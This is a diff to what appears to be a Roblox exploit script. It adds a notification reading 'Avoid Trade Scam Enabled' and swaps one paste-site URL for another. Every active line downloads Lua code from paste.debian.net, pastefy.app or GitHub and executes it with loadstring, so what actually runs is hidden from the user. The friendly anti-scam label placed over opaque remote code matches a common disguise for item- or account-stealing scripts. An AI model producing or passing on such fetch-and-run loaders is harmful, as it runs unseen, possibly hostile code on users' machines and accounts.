@@ -1,2 +1,3 @@
-loadstring(game:HttpGet("https://paste.debian.net/plainh/c7713368/", true))()
+local notificationLibrary=loadstring(game:HttpGet("https://raw.githubusercontent.com/laagginq/ui-libraries/main/xaxas-notification/src.lua"))();local notifications=notificationLibrary.new({NotificationLifetime=7,NotificationPosition="Middle",TextFont=Enum.Font.Code,TextColor=Color3.fromRGB(255,255,255),TextSize=25,TextStrokeTransparency=0,TextStrokeColor=Color3.fromRGB(0,0,0)});notifications:BuildNotificationUI();notifications:Notify("Avoid Trade Scam Enabled: ✅\nEnjoy.");
+loadstring(game:HttpGet("https://paste.debian.net/plainh/76bb65ed/", true))()
 loadstring(game:HttpGet('https://pastefy.app/X3jV29RY/raw'))()
